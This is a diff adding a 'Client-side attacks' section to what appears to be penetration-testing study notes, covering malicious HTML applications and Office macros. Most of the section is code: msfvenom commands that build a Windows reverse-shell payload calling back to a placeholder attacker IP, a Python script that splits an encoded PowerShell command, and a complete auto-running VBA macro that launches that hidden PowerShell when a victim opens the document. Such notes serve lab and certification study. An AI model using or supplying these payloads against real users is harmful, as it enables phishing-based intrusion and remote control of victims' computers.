@@ -177,3 +177,70 @@ sudo smbclient "\\\\<targetIP>\<shareName>"
 Example: <a href="/_walkthroughs/Love">Love</a>
 
 
+# Client-side attacks
+Exploit weaknesses in client software instead of server software. Involves user interaction.\\
+These attacks do not require direct or routable access to the victim's machine.
+
+## HTML applications
+A file with a _.hta_ (instead of _.html_) extension will be interpreted by internet explorer (therefore it only works for IE and Edge to some extent) as an HTML application. This file can be executed by the _mshta.exe_ program.\\
+The purpose of HTML applications is to allow execution of applications directly from IE, rather than downloading and executing it. The _mshata_ program asks the user the permission to run the program.\\
+We use _msfvenom_ to create a _hta_ payload (_evil.hta_):
+
+````
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f hta-psh -o /var/www/html/evil.hta
+`````
+By inspecting the file, we see the payload is based on PowerShell.
+We start a web server and a listener on Kali and browse to it from the victim machine.
+
+## Microsoft Office
+The use of malicious macros in Miscrosoft Office is a well-known client-side attack vector. Macros can be written in VBA (Visual Basic for Applications).\\
+The main procedure in VBA starts with *Sub*, and ends with *End Sub*. As for HTMP applications, we generate a PowerShell payload with _msfvenom_:
+
+````
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f hta-psh -o evil.hta
+`````
+The payload itself is found within the _.hta_ file. However, we can't simply paste it in a macro because VBA has a 255-character limit for strings.
+The original base64 command can be split with the following python script:
+
+````
+str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
+n = 50
+for i in range(0, len(str), n):
+    print "Str = Str + " + '"' + str[i:i+n] + '"'
+`````
+
+Then, it can be included in the macro (Warning: use either _.docm_ or _.doc_ to save the document, and not _.docx_ since it doesn't support embedded macros):
+
+````
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
+    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
+    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
+    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
+    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
+    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
+    ...
+    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
+    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
+    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
+    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
+    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
+    Str = Str + "QA="
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+````
+We can open a netcat listener on Kali and wait for the victim to open and run the macro.
+
+
+## Object linking and embedding
+...
+
